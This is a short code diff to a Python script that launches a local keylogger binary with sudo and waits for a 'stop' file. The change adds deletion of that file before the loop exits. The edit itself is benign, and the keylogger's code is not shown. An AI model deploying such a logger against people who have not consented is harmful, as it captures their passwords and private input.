@@ -26,6 +26,7 @@ subprocess.Popen(["sudo", "./keylogger"], stdout=subprocess.PIPE, stderr=subproc
 while True:
 	time.sleep(1)
 	if os.path.isfile("stop"):
+		os.remove("stop")
 		break
 
 # kill keylogger
